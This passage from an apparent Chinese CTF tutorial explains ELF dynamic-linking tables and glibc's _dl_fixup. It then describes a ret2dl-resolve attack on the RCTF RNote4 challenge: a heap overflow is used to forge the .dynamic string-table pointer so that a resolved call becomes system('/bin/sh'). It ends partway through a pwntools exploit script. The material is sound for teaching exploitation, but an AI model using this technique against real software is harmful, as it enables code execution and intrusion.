个节头，从偏移量 0x17f0 开始：</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000050 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0804821c 00021c 00004a 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          08048266 000266 00000a 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         08048270 000270 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048290 000290 000008 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048298 000298 000010 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        080482a8 0002a8 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080482d0 0002d0 000030 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        08048300 000300 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048310 000310 0001a2 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        080484b4 0004b4 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        080484c8 0004c8 000008 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        080484d0 0004d0 000034 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        08048504 000504 0000ec 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4  //dynamic</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000014 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a014 001014 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a01c 00101c 000004 00  WA  0   0  1</span><br><span class="line">  [27] .comment          PROGBITS        00000000 00101c 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 0016e3 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001054 000460 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 0014b4 00022f 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><h3 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080481CC ; ELF Symbol Table</span><br><span class="line">LOAD:080481CC                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481DC                 Elf32_Sym &lt;offset aRead - offset byte_804821C, 0, 0, 12h, 0, 0&gt; ; "read"</span><br><span class="line">LOAD:080481EC                 Elf32_Sym &lt;offset aGmonStart - offset byte_804821C, 0, 0, 20h, 0, 0&gt; ; "__gmon_start__"</span><br><span class="line">LOAD:080481FC                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804821C, 0, 0, 12h, 0, \ ; "__libc_start_main"</span><br><span class="line">LOAD:080481FC                            0&gt;</span><br><span class="line">LOAD:0804820C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804821C, \ ; "_IO_stdin_used"</span><br><span class="line">LOAD:0804820C                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br></pre></td></tr></table></figure><p>这个东西，是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的puts。结构体定义如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  unsigned char st_info; //对于导入函数符号而言，它是0x12</span><br><span class="line">  unsigned char st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0</span><br></pre></td></tr></table></figure></p><h3 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h3><p>一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个read。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移，比方说，在这里，就是字符串相对0x080481AC的偏移。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804821C ; ELF String Table</span><br><span class="line">LOAD:0804821C byte_804821C    db 0                    ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804821C                                         ; LOAD:080481EC↑o ...</span><br><span class="line">LOAD:0804821D aLibcSo6        db 'libc.so.6',0</span><br><span class="line">LOAD:08048227 aIoStdinUsed    db '_IO_stdin_used',0   ; DATA XREF: LOAD:0804820C↑o</span><br><span class="line">LOAD:08048236 aRead           db 'read',0             ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804823B aLibcStartMain  db '__libc_start_main',0</span><br><span class="line">LOAD:0804823B                                         ; DATA XREF: LOAD:080481FC↑o</span><br><span class="line">LOAD:0804824D aGmonStart      db '__gmon_start__',0   ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:0804825C aGlibc20        db 'GLIBC_2.0',0</span><br><span class="line">LOAD:08048266                 align 4</span><br><span class="line">LOAD:08048268                 dd 2, 10002h, 10001h, 1, 10h, 0</span><br><span class="line">LOAD:08048280                 dd 0D696910h, 20000h, 40h, 0</span><br></pre></td></tr></table></figure></p><h3 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048290 ; ELF REL Relocation Table</span><br><span class="line">LOAD:08048290                 Elf32_Rel &lt;8049FFCh, 206h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:08048298 ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:08048298                 Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:080482A0                 Elf32_Rel &lt;804A010h, 307h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br></pre></td></tr></table></figure><p>这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">  <span class="comment">//一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span></span><br><span class="line">  <span class="comment">//1和3是这个导入函数的符号在.dynsym中的下标，</span></span><br><span class="line">  <span class="comment">//如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure></p><h2 id="gilbc2-23-dl-fixup源码分析"><a href="#gilbc2-23-dl-fixup源码分析" class="headerlink" title="gilbc2.23 _dl_fixup源码分析"></a>gilbc2.23 _dl_fixup源码分析</h2><p>glibc源码阅读网站 <a href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#61" target="_blank" rel="noopener">https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#61</a><br>glibc源码下载网站 <a href="http://ftp.gnu.org/gnu/glibc/" target="_blank" rel="noopener">http://ftp.gnu.org/gnu/glibc/</a></p><p>_dl_fixup函数的两个参数  struct link_map *l , ELFW(Word) reloc _arg都在glibc/elf/link.h中定义<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* 前几个成员是使用调试器的协议的一部分.</span></span><br><span class="line"><span class="comment">       这与SVR4中使用的格式相同.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* ELF文件中的地址与内存中的地址之间的差异*/</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;<span class="comment">/* 绝对文件名对象.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;<span class="comment">/* 共享对象的动态部分 .dynamic  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* 后一个链和前一个链.*/</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We use this macro to refer to ELF types independent of the native wordsize.</span></span><br><span class="line"><span class="comment">   `ElfW(TYPE)' is used in place of `Elf32_TYPE' or `Elf64_TYPE'.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ElfW(type)_ElfW (Elf, __ELF_NATIVE_CLASS, type)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ElfW(e,w,t)_ElfW_1 (e, w, _##t)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ElfW_1(e,w,t)e##w##t</span></span><br></pre></td></tr></table></figure><p>_dl_fixup 在glibc/elf/dl-runtime.c<br>首先说第一个参数，是一个link_map的指针，它包含了.dynamic的指针，通过这个link_map，_dl_runtime_resolve函数可以访问到.dynamic这个section</p><p>而第二个参数，是当前要调用的导入函数在.rel.plt中的偏移（不过64位的话就直接是index下标），比方说这里，read就是0，__libc_start_main就是1*sizeof(Elf32_Rel)=8</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (  </span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS  </span><br><span class="line">    ELF_MACHINE_RUNTIME_FIXUP_ARGS,  </span><br><span class="line"># endif  </span><br><span class="line">    struct link_map *l, ElfW(Word) reloc_arg) &#123;  </span><br><span class="line">    <span class="comment">//获取symtab（存放dynsym的数组）  </span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab  </span></span><br><span class="line"><span class="function">        </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  </span><br><span class="line">    <span class="comment">//获取strtab(存放符号名的数组)   </span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的rel.plt项   </span></span><br><span class="line">    <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc  </span><br><span class="line">        = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的dynsym   </span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  </span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;  </span><br><span class="line">    <span class="comment">//指向对应的got表，以便将解析结果写回去   </span></span><br><span class="line">    <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);  </span><br><span class="line">    <span class="keyword">lookup_t</span> result;  </span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Sanity check that we're really looking at a PLT relocation.  */</span>  </span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not </span></span><br><span class="line"><span class="comment">       used don't look in the global scope.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> = <span class="title">NULL</span>;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) &#123;  </span><br><span class="line">            <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=  </span><br><span class="line">                (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);  </span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;  </span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];  </span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)  </span><br><span class="line">                version = <span class="literal">NULL</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is </span></span><br><span class="line"><span class="comment">        not necessary for objects which cannot be unloaded or when </span></span><br><span class="line"><span class="comment">         we are not using any threads (yet).  */</span>  </span><br><span class="line">        <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P) &#123;  </span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();  </span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">        <span class="comment">//根据符号名,搜索对应的函数，返回libc基地址，并将符号信息保存到sym中   </span></span><br><span class="line">        result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,  </span><br><span class="line">                                      version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span>  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)  </span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//得到结果   </span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result,  </span><br><span class="line">                                     sym ? (LOOKUP_VALUE_ADDRESS (result)  </span><br><span class="line">                                            + sym-&gt;st_value) : <span class="number">0</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load </span></span><br><span class="line"><span class="comment">        address) is also known.  */</span>  </span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);  </span><br><span class="line">        result = l;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* And now perhaps the relocation addend.  */</span>  </span><br><span class="line">    value = elf_machine_plt_value (l, reloc, value);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span>  </span><br><span class="line">            &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))  </span><br><span class="line">        value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Finally, fix up the plt itself.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    <span class="comment">//将结果写回到got表中   </span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>_dl_fixup函数</strong></p><ul><li>1 _dl_fixup函数首先通过宏D_PTR从用link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt的指针</li><li>2 rel.plt + 第二个参数求出当前函数的重定位表项Elf32_Rel的指针，记作rel</li><li>3 rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym</li><li>4 .dynstr + sym-&gt;st_name得出符号名字符串指针</li><li>5 在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表</li><li>6 调用这个函数</li></ul><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>那么，这个怎么去利用呢，有多种利用方式</p><h3 id="伪造-dynsym"><a href="#伪造-dynsym" class="headerlink" title="伪造 .dynsym"></a>伪造 .dynsym</h3><p>即使保护全没开 .dynsym也是不可写的，但可以<br>通过改写.dynamic的DT_STRTAB来伪造ELF String Table，也就是.dynsym<br>这个只有在checksec时No RELRO可行，即.dynamic可写。因为ret2dl-resolve会从.dynamic里面拿.dynstr字符串表的指针，然后加上offset取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够改写这个指针到一块我们能够操纵的内存空间，当resolve的时候，就能resolve成我们所指定的任意库函数。比方说，原本是一个free函数，我们就把原本是free字符串的那个偏移位置设为system字符串，第一次调用free(“bin/sh”)（因为只有第一次才会resolve），就等于调用了system(“/bin/sh”)。</p><p>例题就是RCTF的RNote4，题目是一道堆溢出，NO RELRO而且NO PIE溢出到后面的指针可以实现任意地址写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 a1; <span class="comment">// [rsp+Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span class="comment">// [rsp+Fh] [rbp-11h]</span></span><br><span class="line">  note *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  a1 = <span class="number">0</span>;</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;a1, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !notes[a1] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3 = notes[a1];</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  read_buf(v3-&gt;buf, size);                      <span class="comment">// heap overflow堆溢出</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span class="comment">// [rsp+Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  note *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( number &gt; <span class="number">32</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  v3 = (note *)<span class="built_in">calloc</span>(<span class="number">0x10</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3-&gt;buf = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1u</span>LL); <span class="comment">//堆中存放了指针，所以可以通过这个任意写</span></span><br><span class="line">  <span class="keyword">if</span> ( !v3-&gt;buf )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf(v3-&gt;buf, size);</span><br><span class="line">  v3-&gt;size = size;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; notes[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  notes[i] = v3;</span><br><span class="line">  ++number;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以呢，可以先add两个note，然后编辑第一个note使得堆溢出到第二个note的指针，然后再修改第二个note，实现任意写。至于写什么，刚刚也说了，先写.dynamic指向字符串表的指针，使其指向一块可写内存，比如.bss，然后再写这块内存，使得相应偏移出刚好有个system\x00。exp如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">g_local=<span class="keyword">True</span></span><br><span class="line"><span class="comment">#e=ELF('./libc.so.6')</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="keyword">if</span> g_local:</span><br><span class="line">    sh =process(<span class="string">'./RNote4'</span>)<span class="comment">#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">"rnote4.2018.teamrois.cn"</span>, <span class="number">6767</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span 